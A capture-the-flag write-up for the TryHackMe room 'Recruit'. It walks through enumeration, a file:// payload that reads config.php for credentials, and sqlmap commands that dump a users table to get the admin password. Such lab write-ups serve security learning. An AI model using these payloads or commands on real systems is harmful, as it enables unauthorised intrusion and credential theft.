# Recruit CTF TryHackMe Writeup

<img width="720" height="720" alt="image" src="https://github.com/user-attachments/assets/4e21871b-167e-4fb4-9b92-1de70fe422af" />

## Introduction

Recruit is a medium CTF on TryHackMe that’s focused on web enumeration and SQL injection attacks. In this writeup I will be explaining step by step how to solve it.

## Enumeration

As we all know the first thing you start with in a CTF is an nmap scan:

<img width="720" height="523" alt="image" src="https://github.com/user-attachments/assets/47188137-ea51-403f-92ba-64b74df7eac3" />

Now we know that port 80 is open and there is a website running on there let’s go check it. That’s what we get:

<img width="720" height="345" alt="image" src="https://github.com/user-attachments/assets/7467913c-901a-4756-8994-3b8540e53846" />

A login page but when we go to `/api.php` we get this:

<img width="720" height="316" alt="image" src="https://github.com/user-attachments/assets/feabd9cc-7fdc-4899-82d4-10bec7c02729" />

This is interesting, we will keep that in mind while we use a tool like gobuster to search for directories

<img width="720" height="259" alt="image" src="https://github.com/user-attachments/assets/6a699072-951c-4ff3-b383-11ee8b8a1492" />

First thing you get welcomed with is `/mail` which is very useful so we go there and we find `/mail/mail.log`

<img width="720" height="378" alt="image" src="https://github.com/user-attachments/assets/56b71e22-0bec-48b8-ba79-174b526a7c9f" />

So now we have the username which is `hr` and we know that we can find the password at `config.php` , remember what we found in `/api.php` ? we can use that now by going to

```
file.php?cv=file:///var/www/html/config.php
```

and it worked!! we now have the hr password:

<img width="720" height="488" alt="image" src="https://github.com/user-attachments/assets/6138e8d7-56b5-4750-9355-d273c630cbf7" />

## First flag

Now that we have the username and password we can go back to the login page and login using them and we gets welcomed by the first flag

<img width="720" height="289" alt="image" src="https://github.com/user-attachments/assets/4f7326c5-18b2-489d-b3d3-c5ac3301f8ea" />

## Second flag

Now after we are in the first thing you see is a search bar and my mind instantly tells me to test it for SQLI using ' and that’s what I get:

<img width="720" height="313" alt="image" src="https://github.com/user-attachments/assets/cd997d66-0190-49fa-bba7-bb7e45b8b026" />

Yep SQLI here confirmed all I gotta do now is use sqlmap to dump the admin’s password for me. I started by extracting the databases

```
sqlmap -u "http://10.114.187.172/dashboard.php?search=test" --cookie="PHPSESSID=<your-cookie>" -dbs
```
I got in result
```
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] recruit_db
[*] sys
```
So I used
```
sqlmap -u "http://10.114.187.172/dashboard.php?search=test" --cookie="PHPSESSID=dimun4hk29l7grvhehl0efhdfi" -D recruit_db --tables
```
And got in result:
```
Database: recruit_db
[2 tables]
+------------+
| candidates |
| users      |
+------------+
```
And finally I used
```
sqlmap -u "http://10.114.187.172/dashboard.php?search=test" --cookie="PHPSESSID=dimun4hk29l7grvhehl0efhdfi" -D recruit_db -T users --dump
```
Which got me the admin’s password

<img width="720" height="277" alt="image" src="https://github.com/user-attachments/assets/a4f7320e-a051-416c-94b6-3fb9e550da49" />

Now all I had to do is to go ahead and login as admin and I get welcomed with the second flag

<img width="720" height="315" alt="image" src="https://github.com/user-attachments/assets/a209048c-181d-4ab1-b79b-225d7f315532" />

## Conclusion

This writeup guides you in solving the CTF Recruit on TryHackMe while understanding how you should think as an attacker. Hope you enjoyed reading this and stay safe!!


